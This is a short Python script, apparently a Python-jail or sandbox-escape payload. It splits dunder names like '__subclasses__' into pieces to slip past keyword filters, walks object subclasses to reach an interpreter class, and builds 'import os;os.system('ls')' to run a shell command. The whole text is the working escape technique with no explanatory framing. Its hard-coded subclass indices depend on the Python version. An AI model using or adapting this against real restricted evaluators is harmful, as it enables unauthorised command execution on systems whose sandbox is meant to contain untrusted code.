# 'a': list of references to global classes.
a={}
b='_''_class_'
b+='_'
a=getattr(a,b)

b='_''_base_'
b+='_'
a=getattr(a,b)

b='_''_subcla'
b+='sses_''_'
a=getattr(a,b)
a=a()

# 'z': string with a dot
z=a[6]
z=z([46])
y='decode'
z=getattr(z,y)
z=z('ascii')

# Create an instance of 'code.InteractiveInterpreter'.
# code.InteractiveInterpreter().runcode('import os')
a=a[35] #  .InteractiveInterpreter().runcode('import os')
b='runcode'
a=getattr(a,b)

# 'i': bash script to run.
i='ls'

# 'j': Python code to evaluate.
j='import os;'
j+='os'+z+'sy'
j+='stem(\''+i
j+='\')'

# Go!
a(j)
